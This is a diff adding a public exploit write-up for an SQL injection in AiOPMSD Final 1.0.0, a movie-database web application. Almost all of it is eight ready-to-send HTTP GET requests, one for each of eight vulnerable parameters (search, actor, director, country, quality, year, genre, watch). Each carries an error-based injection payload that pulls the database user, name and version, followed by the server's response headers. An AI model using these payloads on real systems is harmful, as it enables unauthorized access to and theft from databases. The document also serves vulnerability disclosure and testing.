@@ -1,0 +1,170 @@
+# Exploit Title: AiOPMSD Final 1.0.0 - 'q' SQL Injection
+# Dork: N/A
+# Date: 2018-10-24
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://aiopmsd.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/aiopmsd/files/latest/download
+# Version: 1.0.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/search.php?q=[SQL]
+ 
+GET /[PATH]/search.php?q=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 22:28:21 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 172
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/actor.php?actor=[SQL]
+ 
+GET /[PATH]/actor.php?actor=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 22:32:41 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 172
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/director.php?director=[SQL]
+# 
+GET /[PATH]/director.php?director=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 22:34:10 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 172
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 4)
+# http://localhost/[PATH]/country.php?country=[SQL]
+ 
+GET /[PATH]/country.php?country=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 22:35:48 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 172
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 5)
+# http://localhost/[PATH]/quality.php?quality=[SQL]
+ 
+GET /[PATH]/quality.php?quality=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 22:37:11 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 172
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 6)
+# http://localhost/[PATH]/year.php?year=[SQL]
+ 
+GET /[PATH]/year.php?year=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 22:38:38 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 172
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 7)
+# http://localhost/[PATH]/genre.php?genre=[SQL]
+
+GET /[PATH]/genre.php?genre=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 22:39:48 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 172
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 8)
+# http://localhost/[PATH]/watch.php?id=[SQL]
+ 
+GET /[PATH]/watch.php?id=12%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 22:41:11 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 172
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
